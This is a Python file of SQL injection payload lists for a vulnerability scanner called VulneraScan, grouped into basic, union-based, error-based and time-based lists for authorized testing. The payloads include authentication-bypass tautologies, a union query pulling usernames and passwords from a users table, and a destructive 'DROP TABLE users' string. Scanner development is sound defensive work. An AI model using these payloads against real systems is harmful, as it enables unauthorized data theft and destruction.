# SQL injection payloads for VulneraScan
# These payloads are organized into lists based on SQL injection types for easy extraction during testing.
# Each list targets different query behaviors to detect vulnerabilities in web applications.
# Usage: Import and iterate over lists in your vulnerability scanner (e.g., main.py or a new service).
# Note: Use responsibly and only on authorized targets like testphp.vulnweb.com.

# Basic SQL injection payloads
# Purpose: Test for simple SQL errors or unauthorized data exposure by injecting common SQL syntax.
BASIC_SQL_PAYLOADS = [
    "' OR '1'='1",              # Classic tautology to bypass authentication
    "' OR '1'='1' --",          # Tautology with comment to ignore rest of query
    "'; DROP TABLE users; --",   # Attempt to drop a table (destructive, use cautiously)
    "' OR ''=''",                # Empty string tautology
    "1' OR '1'='1",              # Numeric tautology
    "' AND 1=0 --",             # False condition to test error handling
]

# Union-based SQL injection payloads
# Purpose: Attempt to retrieve additional data by appending UNION SELECT queries.
UNION_SQL_PAYLOADS = [
    "' UNION SELECT NULL, NULL --",                    # Basic UNION with NULLs
    "' UNION SELECT username, password FROM users --", # Attempt to extract credentials
    "' UNION SELECT 1, version() --",                  # Retrieve database version
    "' UNION SELECT 1, @@version --",                  # MS SQL Server version
    "' UNION SELECT table_name, NULL FROM information_schema.tables --", # Extract table names
]

# Error-based SQL injection payloads
# Purpose: Trigger database errors to extract information (e.g., version, structure).
ERROR_SQL_PAYLOADS = [
    "' AND 1=CAST((SELECT version()) AS INT) --",      # PostgreSQL/MySQL version via error
    "' AND 1=CONVERT(INT, @@version) --",              # MS SQL Server version via error
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --", # MySQL extract via error
    "' AND (SELECT * FROM (SELECT NAME_CONST(version(), 1))x) --", # MySQL error trigger
]

# Time-based SQL injection payloads
# Purpose: Detect vulnerabilities by causing delays in database responses.
TIME_SQL_PAYLOADS = [
    "' AND SLEEP(5) --",               # MySQL/PostgreSQL delay of 5 seconds
    "' AND IF(1=1, SLEEP(5), 0) --",   # Conditional delay
    "'; WAITFOR DELAY '0:0:5' --",     # MS SQL Server delay of 5 seconds
    "' AND PG_SLEEP(5) --",            # PostgreSQL delay of 5 seconds
    "' AND BENCHMARK(1000000, MD5(1)) --", # MySQL heavy computation delay
]